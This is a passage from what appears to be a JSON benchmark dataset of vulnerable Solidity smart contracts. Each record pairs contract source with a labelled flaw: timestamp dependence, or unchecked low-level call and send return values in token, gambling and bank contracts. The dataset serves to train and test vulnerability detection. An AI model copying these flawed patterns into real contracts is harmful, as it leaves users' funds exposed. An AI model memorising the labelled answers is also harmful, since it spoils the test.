    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "timed_crowdsale.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/timestamp_dependence/timed_crowdsale.sol\n * @author: -\n * @vulnerable_at_lines: 13\n */\n\npragma solidity ^0.4.25;\n\ncontract TimedCrowdsale {\n  // Sale should finish exactly at January 1, 2019\n  function isSaleFinished() view public returns (bool) {\n    // <yes> <report> TIME_MANIPULATION\n    return block.timestamp >= 1546300800;\n  }\n}\n",
    "vulnerable_function": "isSaleFinished",
    "vulnerable_lines": [
      13
    ],
    "vulnerability_type": "timestamp_dependency",
    "original_category": "time_manipulation",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "Timestamp dependency - reliance on block.timestamp for critical logic at line(s) 13",
    "fix_description": "Use block.number for time-based logic or accept timestamp manipulation risk",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/time_manipulation/timed_crowdsale.sol",
    "pragma": "0.4.25",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/timestamp_dependence/timed_crowdsale.sol"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 201,213\n */\n\npragma solidity ^0.4.24;\n\ncontract PoCGame\n{\n    \n    /**\n     * Modifiers\n     */\n     \n    modifier onlyOwner()\n    {\n        require(msg.sender == owner);\n        _;\n    }\n    \n   modifier isOpenToPublic()\n    {\n        require(openToPublic);\n        _;\n    }\n\n    modifier onlyRealPeople()\n    {\n          require (msg.sender == tx.origin);\n        _;\n    }\n\n    modifier  onlyPlayers()\n    { \n        require (wagers[msg.sender] > 0); \n        _; \n    }\n    \n   \n    /**\n     * Events\n     */\n    event Wager(uint256 amount, address depositer);\n    event Win(uint256 amount, address paidTo);\n    event Lose(uint256 amount, address loser);\n    event Donate(uint256 amount, address paidTo, address donator);\n    event DifficultyChanged(uint256 currentDifficulty);\n    event BetLimitChanged(uint256 currentBetLimit);\n\n    /**\n     * Global Variables\n     */\n    address private whale;\n    uint256 betLimit;\n    uint difficulty;\n    uint private randomSeed;\n    address owner;\n    mapping(address => uint256) timestamps;\n    mapping(address => uint256) wagers;\n    bool openToPublic;\n    uint256 totalDonated;\n\n    /**\n     * Constructor\n     */\n    constructor(address whaleAddress, uint256 wagerLimit) \n    onlyRealPeople()\n    public \n    {\n        openToPublic = false;\n        owner = msg.sender;\n        whale = whaleAddress;\n        totalDonated = 0;\n        betLimit = wagerLimit;\n        \n    }\n\n\n    /**\n     * Let the public play\n     */\n    function OpenToThePublic() \n    onlyOwner()\n    public\n    {\n        openToPublic = true;\n    }\n    \n    /**\n     * Adjust the bet amounts\n     */\n    function AdjustBetAmounts(uint256 amount) \n    onlyOwner()\n    public\n    {\n        betLimit = amount;\n        \n        emit BetLimitChanged(betLimit);\n    }\n    \n     /**\n     * Adjust the difficulty\n     */\n    function AdjustDifficulty(uint256 amount) \n    onlyOwner()\n    public\n    {\n        difficulty = amount;\n        \n        emit DifficultyChanged(difficulty);\n    }\n    \n    \n    function() public payable { }\n\n    /**\n     * Wager your bet\n     */\n    function wager()\n    isOpenToPublic()\n    onlyRealPeople() \n    payable\n    public \n    {\n        //You have to send exactly 0.01 ETH.\n        require(msg.value == betLimit);\n        \n        //You cannot wager multiple times\n        require(wagers[msg.sender] == 0);\n\n        //log the wager and timestamp(block number)\n        timestamps[msg.sender] = block.number;\n        wagers[msg.sender] = msg.value;\n        emit Wager(msg.value, msg.sender);\n    }\n    \n    /**\n     * method to determine winners and losers\n     */\n    function play()\n    isOpenToPublic()\n    onlyRealPeople()\n    onlyPlayers()\n    public\n    {\n        uint256 blockNumber = timestamps[msg.sender];\n        if(blockNumber < block.number)\n        {\n            timestamps[msg.sender] = 0;\n            wagers[msg.sender] = 0;\n    \n            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;\n    \n            if(winningNumber == difficulty / 2)\n            {\n                payout(msg.sender);\n            }\n            else \n            {\n                //player loses\n                loseWager(betLimit / 2);\n            }    \n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    /**\n     * For those that just want to donate to the whale\n     */\n    function donate()\n    isOpenToPublic()\n    public \n    payable\n    {\n        donateToWhale(msg.value);\n    }\n\n    /**\n     * Payout ETH to winner\n     */\n    function payout(address winner) \n    internal \n    {\n        uint256 ethToTransfer = address(this).balance / 2;\n        \n        winner.transfer(ethToTransfer);\n        emit Win(ethToTransfer, winner);\n    }\n\n    /**\n     * Payout ETH to whale\n     */\n    function donateToWhale(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Donate(amount, whale, msg.sender);\n    }\n\n    /**\n     * Payout ETH to whale when player loses\n     */\n    function loseWager(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Lose(amount, msg.sender);\n    }\n    \n\n    /**\n     * ETH balance of contract\n     */\n    function ethBalance() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance;\n    }\n    \n    \n    /**\n     * current difficulty of the game\n     */\n    function currentDifficulty() \n    public \n    view \n    returns (uint256)\n    {\n        return difficulty;\n    }\n    \n    \n    /**\n     * current bet amount for the game\n     */\n    function currentBetLimit() \n    public \n    view \n    returns (uint256)\n    {\n        return betLimit;\n    }\n    \n    function hasPlayerWagered(address player)\n    public \n    view \n    returns (bool)\n    {\n        if(wagers[player] > 0)\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n        \n    }\n\n    /**\n     * For the UI to properly display the winner's pot\n     */\n    function winnersPot() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance / 2;\n    }\n\n    /**\n     * A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n     */\n    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) \n    public \n    onlyOwner() \n    returns (bool success) \n    {\n        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface \n{\n    function transfer(address to, uint256 tokens) public returns (bool success);\n}",
    "vulnerable_function": "donateToWhale",
    "vulnerable_lines": [
      201
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Unchecked return value - low-level call result not validated at line(s) 201",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 12\n */\n\npragma solidity ^0.4.10;\n\ncontract Caller {\n    function callAddress(address a) {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        a.call();\n    }\n}",
    "vulnerable_function": "callAddress",
    "vulnerable_lines": [
      12
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 12",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9.sol",
    "pragma": "0.4.10",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x19cf8481ea15427a98ba3cdd6d9e14690011ab10",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x19cf8481ea15427a98ba3cdd6d9e14690011ab10.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 439,465\n */\n\n//DAO Polska Token deployment\npragma solidity ^0.4.11;\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\n\n\n// title Migration Agent interface\ncontract MigrationAgent {\n    function migrateFrom(address _from, uint256 _value);\n}\n\ncontract ERC20 {\n  uint public totalSupply;\n  function balanceOf(address who) constant returns (uint);\n  function allowance(address owner, address spender) constant returns (uint);\n\n  function transfer(address to, uint value) returns (bool ok);\n  function transferFrom(address from, address to, uint value) returns (bool ok);\n  function approve(address spender, uint value) returns (bool ok);\n  event Transfer(address indexed from, address indexed to, uint value);\n  event Approval(address indexed owner, address indexed spender, uint value);\n}\n\n\n\n/**\n * Math operations with safety checks\n */\ncontract SafeMath {\n  function safeMul(uint a, uint b) internal returns (uint) {\n    uint c = a * b;\n    assert(a == 0 || c / a == b);\n    return c;\n  }\n\n  function safeDiv(uint a, uint b) internal returns (uint) {\n    assert(b > 0);\n    uint c = a / b;\n    assert(a == b * c + a % b);\n    return c;\n  }\n\n  function safeSub(uint a, uint b) internal returns (uint) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function safeAdd(uint a, uint b) internal returns (uint) {\n    uint c = a + b;\n    assert(c>=a && c>=b);\n    return c;\n  }\n\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n    return a >= b ? a : b;\n  }\n\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n    return a < b ? a : b;\n  }\n\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n    return a >= b ? a : b;\n  }\n\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n    return a < b ? a : b;\n  }\n\n  function assert(bool assertion) internal {\n    if (!assertion) {\n      throw;\n    }\n  }\n}\n\n\n\n/**\n * Standard ERC20 token with Short Hand Attack and approve() race condition mitigation.\n *\n * Based on code by FirstBlood:\n * https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\n */\ncontract StandardToken is ERC20, SafeMath {\n\n  /* Token supply got increased and a new owner received these tokens */\n  event Minted(address receiver, uint amount);\n\n  /* Actual balances of token holders */\n  mapping(address => uint) balances;\n  // what exaclt ether was sent\n  mapping(address => uint) balancesRAW;\n  /* approve() allowances */\n  mapping (address => mapping (address => uint)) allowed;\n\n  /* Interface declaration */\n  function isToken() public constant returns (bool weAre) {\n    return true;\n  }\n\n  function transfer(address _to, uint _value) returns (bool success) {\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\n    balances[_to] = safeAdd(balances[_to], _value);\n    Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n    uint _allowance = allowed[_from][msg.sender];\n\n    balances[_to] = safeAdd(balances[_to], _value);\n    balances[_from] = safeSub(balances[_from], _value);\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\n    Transfer(_from, _to, _value);\n    return true;\n  }\n\n  function balanceOf(address _owner) constant returns (uint balance) {\n    return balances[_owner];\n  }\n\n  function approve(address _spender, uint _value) returns (bool success) {\n\n    // To change the approve amount you first have to reduce the addresses`\n    //  allowance to zero by calling `approve(_spender, 0)` if it is not\n    //  already 0 to mitigate the race condition described here:\n    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\n    return allowed[_owner][_spender];\n  }\n\n  \n  \n}\n\n\n//  daoPOLSKAtokens\ncontract daoPOLSKAtokens{\n\n    string public name = \"DAO POLSKA TOKEN version 1\";\n    string public symbol = \"DPL\";\n    uint8 public constant decimals = 18;  // 18 decimal places, the same as ETC/ETH/HEE.\n\n    // Receives \n    address public owner;\n    address public migrationMaster;\t\n    // The current total token supply.\n\n    uint256 public otherchainstotalsupply =1.0 ether;\n    uint256 public supplylimit      = 10000.0 ether;\n\t//totalSupply   \n   uint256 public  totalSupply      = 0.0 ether;\n\t//chains:\n\taddress public Chain1 = 0x0;\n\taddress public Chain2 = 0x0;\n\taddress public Chain3 = 0x0;\n\taddress public Chain4 = 0x0;\n\n\taddress public migrationAgent=0x8585D5A25b1FA2A0E6c3BcfC098195bac9789BE2;\n    uint256 public totalMigrated;\n\n\n    event Migrate(address indexed _from, address indexed _to, uint256 _value);\n    event Refund(address indexed _from, uint256 _value);\n\n\t\n\tstruct sendTokenAway{\n\t\tStandardToken coinContract;\n\t\tuint amount;\n\t\taddress recipient;\n\t}\n\tmapping(uint => sendTokenAway) transfers;\n\tuint numTransfers=0;\n\t\n  mapping (address => uint256) balances;\nmapping (address => uint256) balancesRAW;\n  mapping (address => mapping (address => uint256)) allowed;\n\n\tevent UpdatedTokenInformation(string newName, string newSymbol);\t\n \n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\tevent receivedEther(address indexed _from,uint256 _value);\n  event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n      // This notifies clients about the amount burnt\n    event Burn(address indexed from, uint256 value);\n  //tokenCreationCap\n  bool public supplylimitset = false;\n  bool public otherchainstotalset = false;\n   \n  function daoPOLSKAtokens() {\nowner=msg.sender;\nmigrationMaster=msg.sender;\n}\n\nfunction  setSupply(uint256 supplyLOCKER) public {\n    \t   if (msg.sender != owner) {\n      throw;\n    }\n\t\t    \t   if (supplylimitset != false) {\n      throw;\n    }\n\tsupplylimitset = true;\n  \n\tsupplylimit = supplyLOCKER ** uint256(decimals);\n//balances[owner]=supplylimit;\n  } \nfunction setotherchainstotalsupply(uint256 supplyLOCKER) public {\n    \t   if (msg.sender != owner) {\n      throw;\n    }\n\t    \t   if (supplylimitset != false) {\n      throw;\n    }\n\n\totherchainstotalset = true;\n\totherchainstotalsupply = supplyLOCKER ** uint256(decimals);\n\t\n  } \n    /**\n     * Set allowance for other address and notify\n     *\n     * Allows `_spender` to spend no more than `_value` tokens on your behalf, and then ping the contract about it\n     *\n     * @param _spender The address authorized to spend\n     * @param _value the max amount they can spend\n     * @param _extraData some extra information to send to the approved contract\n     */\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n        public\n        returns (bool success) {\n        tokenRecipient spender = tokenRecipient(_spender);\n        if (approve(_spender, _value)) {\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\n            return true;\n        }\n    }\n\n    /**\n     * Destroy tokens\n     *\n     * Remove `_value` tokens from the system irreversibly\n     *\n     * @param _value the amount of money to burn\n     */\n    function burn(uint256 _value) public returns (bool success) {\n        require(balances[msg.sender] >= _value);   // Check if the sender has enough\n        balances[msg.sender] -= _value;            // Subtract from the sender\n        totalSupply -= _value;                      // Updates totalSupply\n        Burn(msg.sender, _value);\n        return true;\n    }\n\n    /**\n     * Destroy tokens from other account\n     *\n     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.\n     *\n     * @param _from the address of the sender\n     * @param _value the amount of money to burn\n     */\n    function burnFrom(address _from, uint256 _value) public returns (bool success) {\n        require(balances[_from] >= _value);                // Check if the targeted balance is enough\n        require(_value <= allowed[_from][msg.sender]);    // Check allowance\n        balances[_from] -= _value;                         // Subtract from the targeted balance\n        allowed[_from][msg.sender] -= _value;             // Subtract from the sender's allowance\n        totalSupply -= _value;                              // Update totalSupply\n        Burn(_from, _value);\n        return true;\n    }\n  \n  function transfer(address _to, uint256 _value) returns (bool success) {\n    //Default assumes totalSupply can't be over max (2^256 - 1).\n    //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n    //Replace the if with this one instead.\n    if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n    //if (balances[msg.sender] >= _value && _value > 0) {\n      balances[msg.sender] -= _value;\n      balances[_to] += _value;\n      Transfer(msg.sender, _to, _value);\n      return true;\n    } else { return false; }\n  }\n\n  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n    //same as above. Replace this line with the following if you want to protect against wrapping uints.\n    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n    //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n      balances[_to] += _value;\n      balances[_from] -= _value;\n      allowed[_from][msg.sender] -= _value;\n      Transfer(_from, _to, _value);\n      return true;\n    } else { return false; }\n  }\n\n  function balanceOf(address _owner) constant returns (uint256 balance) {\n    return balances[_owner];\n  }\n\n  function approve(address _spender, uint256 _value) returns (bool success) {\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n    return allowed[_owner][_spender];\n  }\n\n\n\t\n\t    function () payable  public {\n\t\t if(funding){ \n        receivedEther(msg.sender, msg.value);\n\t\tbalances[msg.sender]=balances[msg.sender]+msg.value;\n\t\t} else throw;\n\t\t\n    }\n   \n\n\n\n\t\n  function setTokenInformation(string _name, string _symbol) {\n    \n\t   if (msg.sender != owner) {\n      throw;\n    }\n\tname = _name;\n    symbol = _symbol;\n\n    UpdatedTokenInformation(name, symbol);\n  }\n\nfunction setChainsAddresses(address chainAd, int chainnumber) {\n    \n\t   if (msg.sender != owner) {\n      throw;\n    }\n\tif(chainnumber==1){Chain1=chainAd;}\n\tif(chainnumber==2){Chain2=chainAd;}\n\tif(chainnumber==3){Chain3=chainAd;}\n\tif(chainnumber==4){Chain4=chainAd;}\t\t\n  } \n\n  function DAOPolskaTokenICOregulations() external returns(string wow) {\n\treturn 'Regulations of preICO and ICO are present at website  DAO Polska Token.network and by using this smartcontract and blockchains you commit that you accept and will follow those rules';\n}\n// if accidentally other token was donated to Project Dev\n\n\n\tfunction sendTokenAw(address StandardTokenAddress, address receiver, uint amount){\n\t\tif (msg.sender != owner) {\n\t\tthrow;\n\t\t}\n\t\tsendTokenAway t = transfers[numTransfers];\n\t\tt.coinContract = StandardToken(StandardTokenAddress);\n\t\tt.amount = amount;\n\t\tt.recipient = receiver;\n\t\tt.coinContract.transfer(receiver, amount);\n\t\tnumTransfers++;\n\t}\n\n     // Crowdfunding:\nuint public tokenCreationRate=1000;\nuint public bonusCreationRate=1000;\nuint public CreationRate=1761;\n   uint256 public constant oneweek = 36000;\nuint256 public fundingEndBlock = 5433616;\nbool public funding = true;\nbool public refundstate = false;\nbool public migratestate= false;\n        function createDaoPOLSKAtokens(address holder) payable {\n\n        if (!funding) throw;\n\n        // Do not allow creating 0 or more than the cap tokens.\n        if (msg.value == 0) throw;\n\t\t// check the maximum token creation cap\n        if (msg.value > (supplylimit - totalSupply) / CreationRate)\n          throw;\n\t\t\n\t\t//bonus structure\n// in early stage there is about 100% more details in ico regulations on website\n// price and converstion rate in tabled to PLN not ether, and is updated daily\n\n\n\n\t var numTokensRAW = msg.value;\n\n        var numTokens = msg.value * CreationRate;\n        totalSupply += numTokens;\n\n        // Assign new tokens to the sender\n        balances[holder] += numTokens;\n        balancesRAW[holder] += numTokensRAW;\n        // Log token creation event\n        Transfer(0, holder, numTokens);\n\t\t\n\t\t// Create additional Dao Tokens for the community and developers around 12%\n        uint256 percentOfTotal = 12;\n        uint256 additionalTokens = \tnumTokens * percentOfTotal / (100);\n\n        totalSupply += additionalTokens;\n\n        balances[migrationMaster] += additionalTokens;\n        Transfer(0, migrationMaster, additionalTokens);\n\t\n\t}\n\tfunction setBonusCreationRate(uint newRate){\n\tif(msg.sender == owner) {\n\tbonusCreationRate=newRate;\n\tCreationRate=tokenCreationRate+bonusCreationRate;\n\t}\n\t}\n\n    function FundsTransfer() external {\n\tif(funding==true) throw;\n\t\t \tif (!owner.send(this.balance)) throw;\n    }\n\t\n    function PartialFundsTransfer(uint SubX) external {\n\t      if (msg.sender != owner) throw;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        owner.send(this.balance - SubX);\n\t}\n\tfunction turnrefund() external {\n\t      if (msg.sender != owner) throw;\n\trefundstate=!refundstate;\n        }\n\t\t\n\t\t\tfunction fundingState() external {\n\t      if (msg.sender != owner) throw;\n\tfunding=!funding;\n        }\n    function turnmigrate() external {\n\t      if (msg.sender != migrationMaster) throw;\n\tmigratestate=!migratestate;\n}\n\n    // notice Finalize crowdfunding clossing funding options\n\t\nfunction finalize() external {\n        if (block.number <= fundingEndBlock+8*oneweek) throw;\n        // Switch to Operational state. This is the only place this can happen.\n        funding = false;\t\n\t\trefundstate=!refundstate;\n        // Transfer ETH to theDAO Polska Token network Storage address.\n        if (msg.sender==owner)\n        // <yes> <report> UNCHECKED_LL_CALLS\n\t\towner.send(this.balance);\n    }\n    function migrate(uint256 _value) external {\n        // Abort if not in Operational Migration state.\n        if (migratestate) throw;\n\n\n        // Validate input value.\n        if (_value == 0) throw;\n        if (_value > balances[msg.sender]) throw;\n\n        balances[msg.sender] -= _value;\n        totalSupply -= _value;\n        totalMigrated += _value;\n        MigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);\n        Migrate(msg.sender, migrationAgent, _value);\n    }\n\t\nfunction refundTRA() external {\n        // Abort if not in Funding Failure state.\n        if (funding) throw;\n        if (!refundstate) throw;\n\n        var DAOPLTokenValue = balances[msg.sender];\n        var ETHValue = balancesRAW[msg.sender];\n        if (ETHValue == 0) throw;\n        balancesRAW[msg.sender] = 0;\n        totalSupply -= DAOPLTokenValue;\n         \n        Refund(msg.sender, ETHValue);\n        msg.sender.transfer(ETHValue);\n}\n\nfunction preICOregulations() external returns(string wow) {\n\treturn 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';\n}\n\n\n}\n\n\n//------------------------------------------------------",
    "vulnerable_function": "PartialFundsTransfer",
    "vulnerable_lines": [
      439
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Unchecked return value - low-level call result not validated at line(s) 439",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x19cf8481ea15427a98ba3cdd6d9e14690011ab10.sol",
    "pragma": "0.4.11",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x2972d548497286d18e92b5fa1f8f9139e5653fd2",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.25; \ncontract demo{\n    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n             // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v[i]);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      14
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 14",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol",
    "pragma": "0.4.25",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x39cfd754c85023648bf003bea2dd498c5612abfa",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x39cfd754c85023648bf003bea2dd498c5612abfa.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n                // <yes> <report> UNCHECKED_LL_CALLS\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n \n}",
    "vulnerable_function": "WithdrawToken",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x39cfd754c85023648bf003bea2dd498c5612abfa.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n                // <yes> <report> UNCHECKED_LL_CALLS\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
    "vulnerable_function": "WithdrawToken",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol",
